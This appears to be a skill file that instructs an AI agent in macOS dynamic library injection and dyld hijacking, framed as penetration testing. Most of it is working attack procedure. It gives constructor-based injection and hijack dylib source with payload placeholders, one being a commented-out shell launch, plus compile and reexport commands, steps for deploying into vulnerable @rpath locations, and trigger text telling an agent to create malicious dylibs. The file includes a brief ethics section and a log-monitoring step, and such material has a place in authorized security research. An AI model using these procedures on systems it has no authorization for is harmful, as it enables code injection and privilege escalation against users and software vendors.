---
name: macos-dyld-hijacking
description: macOS dynamic library injection and hijacking techniques for security research and penetration testing. Use this skill whenever the user needs to analyze macOS binaries for DYLD_INSERT_LIBRARIES vulnerabilities, perform dyld hijacking attacks, create malicious dylibs, check library loading paths, or investigate macOS privilege escalation through dynamic library injection. Trigger on mentions of dyld, DYLD_INSERT_LIBRARIES, dylib injection, macOS library hijacking, @rpath, LC_RPATH, or macOS binary security analysis.
---

# macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES

A skill for performing dynamic library injection attacks on macOS for security research and penetration testing.

## When to Use This Skill

Use this skill when:
- Analyzing macOS binaries for dyld injection vulnerabilities
- Creating dylib injection payloads for testing
- Investigating @rpath and LC_RPATH library loading paths
- Performing dyld hijacking attacks on vulnerable applications
- Checking binary entitlements for library validation bypass
- Monitoring dylib loading events on macOS

## Prerequisites

- macOS system with Xcode command line tools
- Target binary or application to analyze
- Appropriate permissions (sudo may be required for some operations)

## Core Concepts

### DYLD_INSERT_LIBRARIES

Environment variable that allows injecting custom dynamic libraries into processes before they execute. Works on binaries without library validation.

### Dyld Hijacking

Exploiting @rpath and LC_RPATH library loading mechanisms to inject malicious libraries when legitimate libraries are missing from expected locations.

## Quick Start

### 1. Check Binary Vulnerability

```bash
# Check entitlements for library validation bypass
codesign -dv --entitlements :- "/path/to/binary"

# Look for: com.apple.security.cs.disable-library-validation
```

### 2. Analyze Library Loading Paths

```bash
# Check @rpath locations
otool -l "/path/to/binary" | grep LC_RPATH -A 2

# Check libraries loaded via @rpath
otool -l "/path/to/binary" | grep "@rpath" -A 3
```

### 3. Create Injection Library

Use the helper scripts in `scripts/` directory:

```bash
# Create basic injection dylib
./scripts/create_injection_dylib.sh /path/to/target

# Create hijack dylib with reexport
./scripts/create_hijack_dylib.sh /path/to/original_lib /path/to/hijack_location
```

### 4. Test Injection

```bash
# Test DYLD_INSERT_LIBRARIES injection
DYLD_INSERT_LIBRARIES=/path/to/inject.dylib /path/to/binary

# Test dyld hijacking (copy hijacked lib to vulnerable location)
cp /path/to/hijack.dylib /vulnerable/path/lib.dylib
/path/to/binary
```

## Detailed Procedures

### Procedure 1: DYLD_INSERT_LIBRARIES Injection

**Step 1: Create the injection library**

```c
// inject.c
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
    printf("[+] dylib injected in %s\n", argv[0]);
    // Add your payload here
    // execv("/bin/bash", 0);
}
```

**Step 2: Compile the library**

```bash
gcc -dynamiclib -o inject.dylib inject.c
```

**Step 3: Inject into target binary**

```bash
DYLD_INSERT_LIBRARIES=./inject.dylib /path/to/binary
```

### Procedure 2: Dyld Hijacking Attack

**Step 1: Identify vulnerable binary**

```bash
# Check for library validation bypass
codesign -dv --entitlements :- "/path/to/binary" | grep disable-library-validation

# Check @rpath locations
otool -l "/path/to/binary" | grep LC_RPATH -A 2

# Check which libraries use @rpath
otool -l "/path/to/binary" | grep "@rpath" -A 3
```

**Step 2: Find missing library locations**

```bash
# List all @rpath locations
otool -l "/path/to/binary" | grep LC_RPATH -A 2

# Check which libraries actually exist
find /path/to/app -name "*.dylib"
```

**Step 3: Create hijack library**

```objectivec
// lib.m
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"[+] dylib hijacked in %s", argv[0]);
    // Add your payload here
}
```

**Step 4: Compile with version matching**

```bash
# Get version info from original library
otool -l /path/to/original_lib.dylib | grep -A 2 "current version"

# Compile hijack library with matching versions
gcc -dynamiclib \
    -current_version 1.0 \
    -compatibility_version 1.0 \
    -framework Foundation \
    /tmp/lib.m \
    -Wl,-reexport_library,"/path/to/original_lib.dylib" \
    -o "/tmp/lib.dylib"
```

**Step 5: Fix reexport path**

```bash
# Check current reexport path
otool -l /tmp/lib.dylib | grep REEXPORT -A 2

# Change to absolute path
install_name_tool -change @rpath/lib.dylib \
    "/path/to/original_lib.dylib" \
    /tmp/lib.dylib
```

**Step 6: Deploy hijack library**

```bash
# Copy to vulnerable location
cp /tmp/lib.dylib /vulnerable/path/lib.dylib

# Execute target binary
/path/to/binary
```

### Procedure 3: Monitor Dylib Loading

```bash
# Monitor for dylib injection events
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```

## Helper Scripts

### `scripts/check_dyld_vulnerability.sh`

Checks if a binary is vulnerable to dyld injection attacks.

```bash
./scripts/check_dyld_vulnerability.sh /path/to/binary
```

### `scripts/create_injection_dylib.sh`

Creates a basic DYLD_INSERT_LIBRARIES injection library.

```bash
./scripts/create_injection_dylib.sh /path/to/target_binary
```

### `scripts/create_hijack_dylib.sh`

Creates a dyld hijack library with proper reexport.

```bash
./scripts/create_hijack_dylib.sh /path/to/original_lib /path/to/hijack_location
```

### `scripts/monitor_dyld_loading.sh`

Monitors system logs for dylib loading events.

```bash
./scripts/monitor_dyld_loading.sh "search_term"
```

## Safety & Ethics

**Important:**
- Only use these techniques on systems you own or have explicit permission to test
- DYLD_INSERT_LIBRARIES is blocked by System Integrity Protection (SIP) on modern macOS
- Many applications use library validation to prevent injection
- Document your findings and remediate vulnerabilities discovered

## Troubleshooting

### Injection not working

1. Check if SIP is enabled: `csrutil status`
2. Verify binary doesn't have library validation
3. Ensure dylib is compiled for correct architecture
4. Check for hardened runtime protections

### Library not loading

1. Verify @rpath locations are correct
2. Check library version compatibility
3. Ensure reexport path is absolute
4. Verify file permissions

## References

- [CVE-2023-26818 - Telegram TCC Bypass](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- Apple Security Guide - Library Validation
- macOS System Integrity Protection
